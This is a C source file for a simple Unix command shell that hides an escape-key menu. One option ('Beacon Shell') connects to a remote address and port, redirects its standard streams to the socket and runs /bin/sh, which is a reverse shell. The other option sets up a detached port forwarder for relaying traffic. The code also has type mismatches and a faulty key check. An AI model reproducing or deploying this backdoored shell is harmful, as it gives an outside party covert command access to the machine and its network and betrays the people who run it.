#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <signal.h>

#define ESC_KEY 27
#define SHFT_KEY 15
#define PRMTSIZ 10000
#define MAXARGS 10000
#define EXITCMD "exit"

#define DIE(msg) perror(msg); exit(1);
int call_shell(char *REMOTE_ADDRS, int REMOTE_PORTS, char *REMOTE_NAMES);
int ChildProcess(char *REMOTE_NAME);

int main(int argc, char **argv)
{

        int server_port; 
        char *forward_name[20]; 
        int forward_port;

        char *REMOTE_ADDRS[20];
        int REMOTE_PORTS;
        char *REMOTE_NAMES[20];

        int shell;

        for (;;) {
        char input[PRMTSIZ + 1] = { 0x0 };
        char *ptr = input;
        char *args[MAXARGS + 1] = { NULL };
        int wstatus;

        // prompt
        printf("%s ", getuid() == 0 ? "#" : "$");
        fgets(input, PRMTSIZ, stdin);

        // ignore empty input
        if (*ptr == '\n') continue;

        // convert input line to list of arguments
        for (int i = 0; i < sizeof(args) && *ptr; ptr++) {
            if (*ptr == ' ') continue;
            if (*ptr == '\n') break;
            if (*ptr == (ESC_KEY) && (SHFT_KEY))
            {
                int i;
                printf("Sub Shell Menu \n");
                printf("Enter 1: Beacon Shell \n");
                printf("Enter 2: Forwarder \n");
                    scanf("%d", &i);
                    if (i == 1)
                    {
                            printf("Addr\n");
                            scanf("%s",REMOTE_ADDRS);
                            printf("%s\n", REMOTE_ADDRS);

                            printf("Port\n");
                            scanf("%d", &REMOTE_PORTS);
                            printf("%d\n", REMOTE_PORTS);

                            printf("Name\n");
                            scanf("%s", REMOTE_NAMES);
                            printf("%s\n", REMOTE_NAMES);

                            pid_t forkShell;
                            forkShell = fork();
                            if (forkShell == 0)
                            {
                                call_shell(REMOTE_ADDRS, REMOTE_PORTS, REMOTE_NAMES);
                            } 
                    }
                    else if (i == 2)
                    {       
                            printf("server_port\n");
                            scanf("%d", &server_port);
                            printf("%d\n", server_port);

                            printf("IP\n");
                            scanf("%s", forward_name);
                            printf("%s\n", forward_name);

                            printf("Port\n");
                            scanf("%d", &forward_port);
                            printf("%d\n", forward_port);

                            printf("\n");
                            //printf("%d, %s, %d \n", server_port, forward_name, forward_port);
                            
                                portForward (server_port, forward_name, forward_port);               
                    }
                    else
                    {
                        return 0;
                    }
            }
            for (args[i++] = ptr; *ptr && *ptr != ' ' && *ptr != '\n'; ptr++);
            *ptr = '\0';
        }

        // built-in: exit
        if (strcmp(EXITCMD, args[0]) == 0) return 0;

        // fork child and execute program
        signal(SIGINT, SIG_DFL);
        if (fork() == 0) exit(execvp(args[0], args));
        signal(SIGINT, SIG_IGN);

        // wait for program to finish and print exit status
        wait(&wstatus);
        if (WIFEXITED(wstatus)) printf("<%d>", WEXITSTATUS(wstatus));


    }

    return 0;
}

int call_shell(char *REMOTE_ADDRS, int REMOTE_PORTS, char *REMOTE_NAMES)
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDRS);
    sa.sin_port = htons(REMOTE_PORTS);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);
    printf("In Exec Shell\n");
    pid_t forker;
    forker = fork();
    if (forker == 0)
    {
        //ChildProcess(REMOTE_NAMES);
        execl("/bin/sh", REMOTE_NAMES, 0);
        printf("Call Exec Shell\n");
    }
    return 1;
}

int ChildProcess(char *REMOTE_NAME)
{
        execl("/bin/sh", REMOTE_NAME, 0);
        printf("Exec Shell\n");
        return 1;
}


void com(int src, int dst) {
    char buf[1024 * 4];
    int r, i, j;

    r = read(src, buf, 1024 * 4);

    while (r > 0) {
        i = 0;

        while (i < r) {
            j = write(dst, buf + i, r - i);

            if (j == -1) {
                DIE("write"); // TODO is errno EPIPE
            }

            i += j;
        }

        r = read(src, buf, 1024 * 4);
    }

    if (r == -1) {
        DIE("read");
    }

    shutdown(src, SHUT_RD);
    shutdown(dst, SHUT_WR);
    close(src);
    close(dst);
    exit(0);
}

int open_forwarding_socket(char *forward_name, int forward_port) {
    int forward_socket;
    struct hostent *forward;
    struct sockaddr_in forward_address;

    forward = gethostbyname(forward_name);

    if (forward == NULL) {
        DIE("gethostbyname");
    }

    bzero((char *) &forward_address, sizeof(forward_address));
    forward_address.sin_family = AF_INET;
    bcopy((char *)forward->h_addr, (char *) &forward_address.sin_addr.s_addr, forward->h_length);
    forward_address.sin_port = htons(forward_port);

    forward_socket = socket(AF_INET, SOCK_STREAM, 0);

    if (forward_socket == -1) {
        DIE("socket");
    }

    if (connect(forward_socket, (struct sockaddr *) &forward_address, sizeof(forward_address)) == -1) {
        DIE("connect");
    }

    return forward_socket;
}

void forward_traffic(int client_socket, char *forward_name, int forward_port) {
    int forward_socket;
    pid_t down_pid;

    forward_socket = open_forwarding_socket(forward_name, forward_port);

    // Fork - child forwards traffic back to client, parent sends from client
    // to forwarded port
    down_pid = fork();

    if (down_pid == -1) {
        DIE("fork");
    }

    if (down_pid == 0) {
        com(forward_socket, client_socket);
    } else {
        com(client_socket, forward_socket);
    }
}

int open_listening_port(int server_port) {
    struct sockaddr_in server_address;
    int server_socket;

    server_socket = socket(AF_INET, SOCK_STREAM, 0);

    if (server_socket == -1) {
        DIE("socket");
    }

    bzero((char *) &server_address, sizeof(server_address));
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY;
    server_address.sin_port = htons(server_port);

    if (bind(server_socket, (struct sockaddr *) &server_address, sizeof(server_address)) == -1) {
        DIE("bind");
    }

    if (listen(server_socket, 40) == -1) {
        DIE("listen");
    }

    return server_socket;
}

void accept_connection(int server_socket, char *forward_name, int forward_port) {
    int client_socket;
    pid_t up_pid;

    client_socket = accept(server_socket, NULL, NULL);

    if (client_socket == -1) {
        DIE("accept");
    }

    // Fork - Child handles this connection, parent listens for another
    up_pid = fork();

    if (up_pid == -1) {
        DIE("fork");
    }

    if (up_pid == 0) {
        forward_traffic(client_socket, forward_name, forward_port);
        exit(1);
    }

    close(client_socket);
}

int portForward (int *server_port, char *forward_name, int *forward_port) {
    
    int server_socket;
    //parse_arguments(argc, argv, &server_port, &forward_name, &forward_port);
    signal(SIGCHLD,  SIG_IGN);
    server_socket = open_listening_port(server_port);

    pid_t forks;
    forks = fork();
    if (forks > 0)
    {   
        accept_connection(server_socket, forward_name, forward_port); 
        setsid();
    }
    
}
